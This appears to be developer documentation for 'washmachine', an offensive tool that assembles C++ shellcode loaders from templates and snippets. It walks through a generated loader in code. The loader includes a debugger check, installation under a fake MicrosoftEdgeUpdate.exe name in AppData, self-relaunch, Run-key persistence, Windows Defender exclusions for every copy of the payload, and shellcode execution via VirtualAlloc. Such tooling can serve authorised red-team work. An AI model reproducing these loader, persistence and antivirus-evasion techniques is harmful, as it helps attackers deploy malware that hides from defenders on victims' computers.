# Template Engine

The template engine is the core of washmachine. It transforms a template skeleton, a set of snippet selections, and a shellcode source into a complete, compilable C++ file that is immediately handed to the discovered toolchain.

## Overview

Every build passes through three layers:

```text
SharedPreamble
 + Template(with {{PLACEHOLDER}} tokens)
 + Snippets (one fragment per resolved placeholder)
─────────────────────────────────────────────
  → Complete C++ source file
  → C++ compiler (MSVC / GCC / Clang)
  → .exe artifact
```

### 1. SharedPreamble — always injected

Every generated file starts with a fixed block of C++ (`SharedPreamble` in `CompilerService.cs`) that provides runtime helpers available to every snippet. It cannot be disabled and is not template-specific.

### 2. Template — the skeleton

The chosen template provides a C++ `main()` function (or `DllMain` for DLL templates) with `{{PLACEHOLDER}}` tokens at each injection point.

### 3. Snippets — the fragments

Snippet items from the YAML catalog provide the C++ code that replaces each placeholder. Multi-select sections contribute one block per selected item; single-select sections contribute exactly one item's code (or nothing if "None" is selected).

## SharedPreamble details

### Runtime state

| Symbol | Type | Purpose |
|---|---|---|
| `wash_copies[]` | `wchar_t[32][MAX_PATH]` | Every on-disk path where the payload landed |
| `wash_copies_count` | `int` | Number of occupied slots |
| `wash_install_path` | `wchar_t[MAX_PATH]` | Canonical install path — set by the Installation snippet; empty = run-in-place |

### Helper functions

| Function | Description |
|---|---|
| `wash_payload_path()` | Returns `wash_install_path` if set; otherwise calls `GetModuleFileNameW(NULL)` for the running executable's path |
| `wash_track(path)` | Appends a path to `wash_copies[]`; called by Installation and persistence snippets |
| `wash_track_self()` | Tracks the running executable at startup |
| `wash_run_as_admin(wait)` | Re-launches the current executable with the `runas` verb and optionally waits for the child |
| `wash_is_elevated()` | Returns `true` when the process token holds `SeDebugPrivilege` (admin) |

### Startup tracking

`wash_track_self()` is invoked before `main()` via a static initializer:

```cpp
static int _wash_self_init = (wash_track_self(), 0);
```

This ensures the running executable's path is always the first entry in `wash_copies[]`, even when no Installation or persistence snippet ran.

## Template anatomy

```yaml
templates:
  - id: "default"
    display: "Default Loader"
    preamble: ""          # Per-template C++ preamble (appended after SharedPreamble)
    content: |
      INT main(VOID) {
        {{SHELLCODE_SOURCE}}
        {{ANTI_EMULATION}}
        {{GUARDRAILS}}
        {{ANTI_SANDBOX}}
        {{ANTI_DEBUGGING}}
        {{DECOY}}
        {{UAC_BYPASS}}
        {{INSTALLATION}}
        {{PERSISTENCE}}
        {{EVASION}}
        {{PROCESS_INJECTION}}
        {{SHELLCODE_EXECUTION}}
        return 0;
      }
    placeholders:
      - name: "ANTI_EMULATION"
        kind: "snippet"
        snippetTemplate: "antiemulation"
      - name: "INSTALLATION"
        kind: "snippet"
        snippetTemplate: "installation"
      - name: "SHELLCODE_SOURCE"
        kind: "system"    # Resolved by CompilerService, not the YAML catalog
```

### Placeholder kinds

| Kind | Resolution |
|---|---|
| `snippet` | Look up the selected item(s) in the section whose `template` key matches `snippetTemplate`; inject their C++ code |
| `system` | Resolved by `CompilerService` from non-YAML inputs (shellcode bytes, URL fetch, web payload) |

## Snippet resolution

For each `{{PLACEHOLDER}}` token:

1. Find the placeholder definition matching by `name`.
2. If `kind = snippet`, locate the section whose `template` key equals `snippetTemplate`.
3. Find the item(s) selected for that section in the current build.
4. Collect each item's `snippet`, `includes`, and `implementation` blocks.
5. Concatenate and inject the result at the token position.

A section with no item selected (single-select "None") resolves to an empty string — the placeholder disappears from the generated source.

## Template execution order

The order of `{{PLACEHOLDER}}` tokens within `main()` is intentional:

```text
SHELLCODE_SOURCE     — decode / prepare payload bytes
ANTI_EMULATION       — stall or confuse AV emulators
GUARDRAILS           — check environment before proceeding
ANTI_SANDBOX         — detect virtual machines / sandboxes
ANTI_DEBUGGING       — detect active debuggers
DECOY                — optional distraction action
UAC_BYPASS           — re-launch elevated if needed
INSTALLATION         — copy loader to stable path; sets wash_install_path
PERSISTENCE          — register stable path with OS for re-execution
EVASION              — apply exclusions / anti-forensic steps
PROCESS_INJECTION    — inject shellcode into a remote process
SHELLCODE_EXECUTION  — execute shellcode in the current process
```

The placement of `INSTALLATION` before `PERSISTENCE` and `EVASION` is the foundation of the path-coordination system described below.

## Path coordination: Installation → Persistence → Evasion

### The problem (before Installation category)

Every persistence snippet historically called `GetModuleFileNameW(NULL, ...)` to obtain the path it would register in a Run key or Scheduled Task. If the operator ran the loader from `Downloads\` or a `%Temp%` directory, that ephemeral path was baked into persistence — broken as soon as the file was moved or deleted.

### The solution: `wash_install_path` + `wash_payload_path()`

```
┌─────────────────────────────────┐
│  Installation snippet runs      │
│  CopyFileW(src → stable_path)   │
│  wash_track(stable_path)        │
│  wash_install_path = stable_path│
└────────────────┬────────────────┘
                 │ wash_payload_path() now returns stable_path
                 ▼
┌─────────────────────────────────┐
│  Persistence snippet runs       │
│  path = wash_payload_path()     │
│  → registers stable_path        │
└────────────────┬────────────────┘
                 │
                 ▼
┌─────────────────────────────────┐
│  Evasion snippet runs           │
│  iterates wash_copies[]         │
│  → excludes every tracked path  │
└─────────────────────────────────┘
```

`wash_payload_path()` has a built-in fallback: when `wash_install_path` is empty (i.e., the `None` installation item was selected, or no installation snippet ran), it returns `GetModuleFileNameW(NULL)` — the current executable's path. This preserves full backwards compatibility with builds that do not use the Installation section.

### Relaunch loop prevention

Non-`None` installation items compare the current executable path against the destination before acting:

```cpp
if (_wcsicmp(_inst_src, _inst_dst) != 0) {
    // Copy, relaunch, exit.
    CopyFileW(_inst_src, _inst_dst, FALSE);
    CreateProcessW(_inst_dst, ...);
    ExitProcess(0);
}
// Already at destination: just set wash_install_path.
wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
wash_track(wash_install_path);
```

When the relaunched process starts, `_inst_src == _inst_dst`, so it skips the copy branch, sets `wash_install_path`, and continues normally to the Persistence and Evasion snippets.

## wash_copies[]: complete path tracking

Every path where the payload lands is tracked via `wash_track()`:

| Event | Caller |
|---|---|
| Loader starts | `wash_track_self()` static initializer |
| Installation copies to stable dir | Installation snippet |
| Persistence drops to User Startup Folder | `StartupFolder` snippet |
| Persistence drops to All-Users Startup | `AllUsersStartup` snippet |
| Persistence copies for Logon Script | `LogonScript` snippet |
| Evasion: Defender Exclusion runs | Calls `wash_track(wash_payload_path())` to ensure the install path is covered |

### Why Defender exclusion covers all paths

The `DefenderExclusion` evasion snippet iterates the full `wash_copies[]` array and applies `Add-MpPreference -ExclusionPath` to every entry:

```cpp
wash_track(wash_payload_path());            // ensure install path is present
for (int i = 0; i < wash_copies_count; i++) {
    // build and execute: Add-MpPreference -ExclusionPath "<wash_copies[i]>"
}
```

This guarantees exclusions cover:

- The **original launch path** (tracked at startup by `wash_track_self()`).
- The **stable install directory** (tracked by the Installation snippet).
- Every **persistence drop location** (tracked by each persistence snippet that copies the file to a separate directory).

## Installation items reference

| Item ID | Location | Admin required |
|---|---|---|
| `None` | Run in-place — `wash_install_path` stays empty | No |
| `AppDataDir` | `%APPDATA%\<subdir>\<filename>` | No |
| `LocalAppDataDir` | `%LOCALAPPDATA%\<subdir>\<filename>` | No |
| `ProgramDataDir` | `%ProgramData%\<subdir>\<filename>` | Yes (`requires: [uac_bypass]`) |

`AppDataDir` and `LocalAppDataDir` accept two text inputs — the sub-directory name and the installed filename — configurable in the desktop UI or via the `TEXT_INPUTS` option in the CLI.

::: tip Run-in-place mode
Selecting `None` (the default) leaves `wash_install_path` empty. `wash_payload_path()` falls back to `GetModuleFileNameW(NULL)`. Persistence and evasion snippets behave identically to pre-Installation builds — no behaviour change unless an installation item is explicitly chosen.
:::

## Generated source walkthrough

Given: template `default`, shellcode from a `.bin` file, snippets `antidebugging=IsDebuggerPresent`, `installation=AppDataDir`, `persistence=HkcuRunKey`, `evasion=DefenderExclusion`.

The engine emits a `.cpp` file structured as:

```cpp
// ── SharedPreamble (always present) ────────────────────────────────────────
#include <windows.h>
#include <shlobj.h>
// ...
static wchar_t wash_install_path[MAX_PATH] = {0};
static const wchar_t* wash_payload_path(void) { /* ... */ }
static void wash_track(const wchar_t* path)   { /* ... */ }
static int _wash_self_init = (wash_track_self(), 0);
// ...

// ── Template preamble (empty for default) ──────────────────────────────────

// ── Snippet includes (collected from all selected items) ───────────────────
#include <windows.h>
#pragma comment(lib, "advapi32.lib")

// ── main() — placeholders resolved in order ────────────────────────────────
INT main(VOID) {

    // {{SHELLCODE_SOURCE}} — resolved by CompilerService
    unsigned char buf[] = { 0xfc, 0x48, ... };

    // {{ANTI_EMULATION}} — no item selected → empty

    // {{GUARDRAILS}}     — no item selected → empty

    // {{ANTI_SANDBOX}}   — no item selected → empty

    // {{ANTI_DEBUGGING}} — IsDebuggerPresent snippet
    if (IsDebuggerPresent()) ExitProcess(0);

    // {{DECOY}}          — no item selected → empty

    // {{UAC_BYPASS}}     — no item selected → empty

    // {{INSTALLATION}}   — AppDataDir snippet
    {
        WCHAR _inst_src[MAX_PATH] = {0};
        WCHAR _inst_dir[MAX_PATH] = {0};
        WCHAR _inst_dst[MAX_PATH] = {0};
        wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
        ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\EdgeUpdate", _inst_dir, MAX_PATH);
        SHCreateDirectoryExW(NULL, _inst_dir, NULL);
        wsprintfW(_inst_dst, L"%s\\MicrosoftEdgeUpdate.exe", _inst_dir);
        if (_wcsicmp(_inst_src, _inst_dst) != 0) {
            if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
                STARTUPINFOW si = {sizeof(si)};
                PROCESS_INFORMATION pi = {0};
                CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                ExitProcess(0);
            }
        }
        wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
        wash_track(wash_install_path);
    }

    // {{PERSISTENCE}} — HkcuRunKey snippet; uses wash_payload_path()
    {
        wchar_t _hkcu[MAX_PATH];
        wcscpy_s(_hkcu, MAX_PATH, wash_payload_path()); // ← stable install path
        HKEY hKey;
        RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        RegSetValueExW(hKey, L"MicrosoftEdgeUpdate", 0, REG_SZ,
            (BYTE*)_hkcu, (DWORD)((wcslen(_hkcu) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }

    // {{EVASION}} — DefenderExclusion snippet
    wash_track(wash_payload_path());
    for (int i = 0; i < wash_copies_count; i++) {
        // PowerShell: Add-MpPreference -ExclusionPath "<wash_copies[i]>"
    }

    // {{PROCESS_INJECTION}} — no item selected → empty

    // {{SHELLCODE_EXECUTION}} — template default (VirtualAlloc RW→RX + CreateThread)
    LPVOID addr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(addr, buf, sizeof(buf));
    // ...
    return 0;
}
```

## Session artifacts

Every build writes to `logging/session_<date>_<guid>/`:

| Artifact | Contents |
|---|---|
| `source.cpp` | Generated C++ source before compilation |
| `build.log` | Raw compiler stdout and stderr |
| `session.json` | Metadata: template ID, snippet selections, shellcode hash, output path |
